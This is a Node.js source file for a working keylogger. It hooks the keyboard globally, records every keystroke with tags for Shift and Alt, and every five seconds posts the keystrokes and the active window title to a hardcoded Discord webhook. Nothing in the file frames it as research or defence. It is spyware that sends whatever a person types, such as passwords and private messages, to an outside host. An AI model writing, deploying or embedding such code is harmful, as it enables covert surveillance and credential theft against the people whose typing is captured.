const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener;
const axios = require('axios');
const activeWindow = require('active-win');

const v = new GlobalKeyboardListener();

let l_shift_dn = false;
let l_alt_dn = false;
let r_shift_dn = false;
let r_alt_dn = false;
let keylogs = '';
let activeWindowTitle = '';

// Log every key that's pressed
v.addListener(function (e, down) {
    if (e.state === 'UP') {
        switch (e.name) {
            case 'TAB':
                process.stdout.write('<tab>');
                keylogs += '<tab>';
                break;
            case 'RETURN':
                process.stdout.write('<enter>');
                keylogs += '<enter>';
                break;
            case 'SPACE':
                process.stdout.write('<space>');
                keylogs += '<space>';
                break;
            case 'ESCAPE':
                process.stdout.write('<esc>');
                keylogs += '<esc>';
                break;
            case 'DELETE':
                process.stdout.write('<del>');
                keylogs += '<del>';
                break;
            case 'BACKSPACE':
                process.stdout.write('<b.space>');
                keylogs += '<b.space>';
                break;
            case 'LEFT SHIFT':
                if (l_shift_dn) {
                    process.stdout.write('</l.shift>');
                    keylogs += '</l.shift>';
                    l_shift_dn = false;
                }
                break;
            case 'LEFT ALT':
                if (l_alt_dn) {
                    process.stdout.write('</l.alt>');
                    keylogs += '</l.alt>';
                    l_alt_dn = false;
                }
                break;
            case 'RIGHT SHIFT':
                if (r_shift_dn) {
                    process.stdout.write('</r.shift>');
                    keylogs += '</r.shift>';
                    r_shift_dn = false;
                }
                break;
            case 'RIGHT ALT':
                if (r_alt_dn) {
                    process.stdout.write('</r.alt>');
                    keylogs += '</r.alt>';
                    r_alt_dn = false;
                }
                break;
            case 'DOT':
                process.stdout.write('.');
                keylogs += '.';
                break;
            case 'COMMA':
                process.stdout.write(',');
                keylogs += ',';
                break;
            case 'LESS THAN':
                process.stdout.write('<');
                keylogs += '<';
                break;
            case 'GREATER THAN':
                process.stdout.write('>');
                keylogs += '>';
                break;
            case 'FORWARD SLASH':
                process.stdout.write('/');
                keylogs += '/';
                break;
            case 'QUESTION MARK':
                process.stdout.write('?');
                keylogs += '?';
                break;
            case 'QUOTE':
                process.stdout.write('"');
                keylogs += '"';
                break;
            case 'APOSTROPHE':
                process.stdout.write("'");
                keylogs += "'";
                break;
            case 'OPEN CURLY BRACE':
                process.stdout.write('{');
                keylogs += '{';
                break;
            case 'CLOSE CURLY BRACE':
                process.stdout.write('}');
                keylogs += '}';
                break;
            case 'OPEN BRACKET':
                process.stdout.write('[');
                keylogs += '[';
                break;
            case 'CLOSE BRACKET':
                process.stdout.write(']');
                keylogs += ']';
                break;
            case 'BACKSLASH':
                process.stdout.write('\\');
                keylogs += '\\';
                break;
            case 'PIPE':
                process.stdout.write('|');
                keylogs += '|';
                break;
            default:
                process.stdout.write(e.name.toLowerCase());
                keylogs += e.name.toLowerCase();
        }
    }
    if (e.state === 'DOWN') {
        switch (e.name) {
            case 'LEFT SHIFT':
                if (!l_shift_dn) {
                    l_shift_dn = true;
                    process.stdout.write('<l.shift>');
                    keylogs += '<l.shift>';
                }
                break;
            case 'LEFT ALT':
                if (!l_alt_dn) {
                    l_alt_dn = true;
                    process.stdout.write('<l.alt>');
                    keylogs += '<l.alt>';
                }
                break;
            case 'RIGHT SHIFT':
                if (!r_shift_dn) {
                    r_shift_dn = true;
                    process.stdout.write('<r.shift>');
                    keylogs += '<r.shift>';
                }
                break;
            case 'RIGHT ALT':
                if (!r_alt_dn) {
                    r_alt_dn = true;
                    process.stdout.write('<r.alt>');
                    keylogs += '<r.alt>';
                }
                break;
        }
    }
});

setInterval(async () => {
    const window = await activeWindow();
    activeWindowTitle = window.title;

    await axios.post('https://discord.com/api/webhooks/1232572396876201994/LyFIN9LqXUyhziOk91-Z4gS2ZjcbvTnvnNWMGK-gvck2uaiyOnwYMdXWUuQXNG0u5xkR', {
        "content": `[${activeWindowTitle}]\n${keylogs}`
    }).then(async () => {
        keylogs = '';
    });
}, 5000);